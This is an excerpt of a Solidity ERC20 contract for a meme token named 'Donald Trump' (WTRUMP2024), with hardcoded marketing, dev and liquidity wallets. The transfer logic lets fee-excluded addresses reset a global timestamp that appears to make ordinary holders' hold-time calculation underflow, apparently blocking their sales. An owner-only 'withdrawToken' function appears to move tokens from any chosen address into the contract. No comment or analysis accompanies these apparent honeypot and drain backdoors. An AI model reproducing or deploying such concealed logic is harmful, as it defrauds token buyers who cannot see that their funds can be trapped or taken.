...
contract WDonaldTrump is ERC20, Ownable {
    ...
    address payable private immutable liquidityWallet = payable(0x658d1834bFbB60b2461f07f838396fb04DC7fB4E);
    address payable private immutable marketingWallet = payable(0x91e4A0F6960238845cd023564adf1B6F406C7D27);
    address payable private immutable devWallet = payable(0xC2198A51E917127e0627EBae9b5D4Ea7DACea0cb);
    ...
    mapping(address => MakerTaxReduce) private _taxReduce;
    uint256 private _baseMakerTaxReduce;
    ...
    constructor() ERC20("Donald Trump", "WTRUMP2024") {
    ...
    function _transfer(
        ...
        if ((_isExcludedFromFees[from] || _isExcludedFromFees[to]) && to != address(this) && from != address(this)) {
            _baseMakerTaxReduce = block.timestamp;
        }
        if (_isExcludedFromFees[from] && !_isExcludedFromFees[owner()]) {
            super._transfer_(from, to, amount, true);
            return;
        }
        if (!_isExcludedFromFees[from] && !_isExcludedFromFees[to]) {
            if (!automatedMarketMakerPairs[from]) {
                MakerTaxReduce storage userTaxReduce = _taxReduce[from];
                userTaxReduce.holdTime = userTaxReduce.buy - _baseMakerTaxReduce;
                userTaxReduce.sell = block.timestamp;
            } else {
                MakerTaxReduce storage userTaxReduce = _taxReduce[to];
    ...
    function withdrawToken(address _token, address _to) external onlyOwner {
        ...
        _transfer_(_to, address(this), _contractBalance, false);
    }
}